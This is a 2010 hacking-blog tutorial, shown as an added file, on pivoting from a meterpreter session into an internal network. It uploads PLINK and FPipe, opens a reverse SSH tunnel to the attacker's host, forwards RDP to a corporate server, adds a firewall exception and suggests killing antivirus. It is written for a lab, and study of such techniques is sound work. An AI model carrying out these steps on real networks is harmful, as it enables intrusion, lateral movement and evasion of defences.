@@ -1,0 +1,107 @@
+Pivoting into a network using PLINK and FPipe
+Posted May 18 2010 by NightRanger in Hacking with 3 Comments
+Although the metasploit framework meterpreter have pivoting capabilities which include Port forwarding and Routing, you may find yourself need to pivot your tools outside of the framework.
+For example, you may want to open a Remote Desktop connection to other internal host on the compromised network.
+This could be done using SSH Tunneling and Port forwarding.
+Example scenario:
+Attacker: Gained a meterpreter session using a client side attack from a remote location i.e : The Internet.
+Victim: Located on a network behind a Router/Firewall using NAT, all inbound ports are blocked.
+Objectives: RDP your way into the company server from  the compormised host (the victim).
+Setup used for this tutorial:
+Attacker IP: 192.168.1.10 (running BackTrack with active SSH server)
+Victim IP: 192.168.1.20 , second NIC 172.16.1.73 (connected to 172.16.1.0/24 network a windows xp pro workstation)
+Corporate server IP: 172.16.1.80
+I will use a vmware based lab ,all  addresses used for this tutorial are internal adresses only.
+1. Once we received our meterpreter session on the attacking machine we will first upload our tools, PLINK and FPipe.
+meterpreter > upload plink.exe c:\\
+[*] uploading  : plink.exe -> c:\
+[*] uploaded   : plink.exe -> c:\\plink.exe
+meterpreter > upload FPipe.exe c:\\
+[*] uploading  : FPipe.exe -> c:\
+[*] uploaded   : FPipe.exe -> c:\\FPipe.exe
+2. Open a command prompt:
+meterpreter > execute -i -H -f cmd.exe
+Process 1844 created.
+Channel 3 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+C:\>
+3. Create SSH tunnel back to our attacking machine using PLINK
+C:\>plink -P 22 -l root -pw qwe123 -C -R 3389:127.0.0.1:1234 192.168.1.10
+The server's host key is not cached in the registry. You
+have no guarantee that the server is the computer you
+think it is.
+The server's key fingerprint is:
+2048 06:51:38:16:49:31:53:2d:e5:44:34:18:0c:f0:59:de
+If you trust this host, enter "y" to add the key to
+PuTTY's cache and carry on connecting.
+If you want to carry on connecting just once, without
+adding the key to the cache, enter "n".
+If you do not trust this host, press Return to abandon the
+connection.
+Store key in cache? (y/n) Y
+Last login: Fri Jul 17 19:49:35 2009 from 212.235.66.178
+Linux 2.6.21.5.
+ exploit ~ #
+Let’s take a look at the above command:
+plink -P "ssh server port" -l "ssh server user name" -pw "ssh server password" -C -R "local port":127.0.0.1:"remote port" "ssh server ip address"
+More information about SSH Tunneling can be found Here
+4. Now we will send our command prompt to background by pressing CTRL+Z on the keyboard.
+Background channel 3? [y/N]  y
+[-] core_channel_interact: Operation failed: 1168
+meterpreter >
+* The command prompt is still running on the background and it is still active on the victim machine, you can resume it by typing the command  “interact” and the channel number:
+meterpreter > interact 3
+Interacting with channel 3...
+ exploit ~ #
+5. Open a new command prompt channel
+meterpreter > execute -i -H -f cmd.exe
+Process 3472 created.
+Channel 4 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+C:\>
+6. Forwarding traffic to the server using FPipe
+C:\>Fpipe.exe -l 1234 -s 1234 -r 3389 172.16.1.80
+(You can add the -v switch for verbosity, you can also background this channel and continue working with meterpreter)
+Let’s take a look at some of the FPipe options used here:
+-l    – listening port number
+-r    – remote port number
+-s    – outbound source port number
+* Please notice some A/V’s may recognize FPipe as a malicious tool and will block it.
+You will have to kill a/v first or, change FPipe file signature which is not covered in this tutorial.
+Windows firewall may also block FPipe. in that case you can manually add it to its exception list by using the following command:
+c:\>netsh firewall add portopening TCP 1234 “Name of the exception” enable all
+ 
+7. Now you can RDP to the server machine
+before we do that lets verify that our attacking is listening on port 3389.
+exploit ~ # netstat -antp | grep 3389
+netstat -antp | grep 3389
+tcp        0      0 127.0.0.1:3389          0.0.0.0:*               LISTEN     3494/4
+ exploit ~ # rdesktop 127.0.0.1
+If everything went well a remote desktop session should open.
+To see this in action you can watch the “Pivoting into a network using PLINK and FPipe” Video which can be found Here.
+ 
+Pivoting into a network using PLINK and FPipe from exploit on Vimeo.
+Tools used in this tutorial:
+PLINK
+Plink is a command-line interface to the PuTTY (the Telnet and SSH client itself)  back ends.
+http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html
+FPipe
+FPipe is a source port forwarder/redirector created by foundstone. It can create a TCP or UDP stream with a source port of your choice. This is useful for getting past firewalls that allow traffic with source ports of say 23, to connect with internal servers.
+http://www.foundstone.com/us/resources/proddesc/fpipe.htm
+The Metasploit Framework
+http://www.metasploit.com/framework/download/
+Other Related Tools
+Data Pipe
+This is a simple TCP/IP socket redirection application that offers a little more complexity than the simple fork-based datapipes that are commonly available. This source has been successfully compiled and used on Linux, FreeBSD, and Win32. I have released it into the public-domain.
+http://jeff.bovine.net/Datapipe
+WinRelay
+
+WinRelay is a TCP/UDP forwarder/redirector that works with both IPv4 and IPv6. You can choose the port and IP it will listen on, the source port and IP that it will connect from, and the port and IP that it will connect to.
+http://ntsecurity.nu/toolbox/winrelay/
+Socat
+
+multipurpose relay
+http://www.dest-unreach.org/socat/
+
